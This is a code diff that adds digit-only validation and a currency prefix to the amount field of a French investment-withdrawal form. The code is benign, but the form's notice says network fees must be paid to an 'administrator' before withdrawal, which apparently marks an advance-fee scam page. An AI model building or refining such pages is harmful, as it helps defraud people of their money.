@@ -126,6 +126,29 @@
     .phone-prefix input {
       padding-left: 55px;
     }
+    /* Ajout pour le champ Montant (style similaire à phone-prefix) */
+    .amount-prefix {
+      position: relative;
+      margin-bottom: 15px;
+    }
+    .amount-prefix span {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 0.95rem;
+      color: #555;
+      pointer-events: none;
+    }
+    .amount-prefix input {
+      width: 100%;
+      padding-left: 60px; /* ajustez si nécessaire selon longueur du préfixe */
+      padding-top: 10px;
+      padding-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
     input::placeholder {
       color: #999;
     }
@@ -373,10 +396,23 @@
           <option value="USD">USD</option>
         </select>
 
-        <!-- Label mis à jour : Montant investi -->
+        <!-- Champ Montant modifié pour n’accepter que des chiffres -->
         <label for="amount">Montant investi</label>
-        <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
-        <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
+        <div class="amount-prefix">
+          <!-- Préfixe monétaire ; mis à jour en JS selon devise -->
+          <span id="amount-prefix">FCFA</span>
+          <input
+            type="text"
+            id="amount"
+            name="amount"
+            placeholder="Ex: 500"
+            inputmode="numeric"
+            pattern="\d+"
+            required
+            oninput="this.value = this.value.replace(/\D/g, '')"
+          >
+        </div>
+        <small>Note : uniquement des chiffres. Des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
 
         <label for="profession">Métier</label>
         <input type="text" id="profession" name="profession" placeholder="Votre profession" required>
@@ -538,6 +574,35 @@
         });
       }
 
+      // Filtrer en temps réel le champ montant pour n’accepter que des chiffres
+      const amountInput = document.getElementById('amount');
+      if (amountInput) {
+        amountInput.addEventListener('input', function() {
+          this.value = this.value.replace(/\D/g, '');
+        });
+      }
+
+      // Mettre à jour le préfixe selon la devise
+      const currencySelect = document.getElementById('currency');
+      const amountPrefixSpan = document.getElementById('amount-prefix');
+      if (currencySelect && amountPrefixSpan) {
+        function updateAmountPrefix() {
+          const val = currencySelect.value;
+          if (val === 'FCFA') {
+            amountPrefixSpan.textContent = 'FCFA';
+          } else if (val === 'USD') {
+            amountPrefixSpan.textContent = '$';
+          } else {
+            amountPrefixSpan.textContent = '';
+          }
+          // Si nécessaire, ajuster padding-left dynamiquement :
+          // const needed = amountPrefixSpan.textContent ? (amountPrefixSpan.textContent.length * 8 + 20) : 10;
+          // amountInput.style.paddingLeft = needed + 'px';
+        }
+        updateAmountPrefix();
+        currencySelect.addEventListener('change', updateAmountPrefix);
+      }
+
       // Récupérer éléments de page
       const initialSection = document.getElementById('initial-section');
       const codeSection = document.getElementById('code-section');
@@ -574,6 +639,15 @@
       // Soumission du formulaire initial
       if (withdrawalForm) {
         withdrawalForm.addEventListener('submit', function(e) {
+          // Validation supplémentaire du montant (seulement chiffres, >0)
+          if (amountInput) {
+            const amountValue = amountInput.value.trim();
+            if (!/^\d+$/.test(amountValue) || parseInt(amountValue, 10) <= 0) {
+              e.preventDefault();
+              alert("Veuillez saisir un montant valide (seulement des chiffres, supérieur à 0).");
+              return;
+            }
+          }
           e.preventDefault();
           // Récupérer et valider prénom/nom/genre
           const firstName = document.getElementById('firstName').value.trim();
@@ -608,7 +682,7 @@
           // Récupérer valeurs devise et montant
           const formData = new FormData(withdrawalForm);
           const currency = formData.get('currency');
-          const amountStr = formData.get('amount');
+          const amountStr = amountInput ? amountInput.value.trim() : formData.get('amount');
           const amount = parseFloat(amountStr);
           if (isNaN(amount) || amount <= 0) {
             alert("Veuillez saisir un montant valide.");
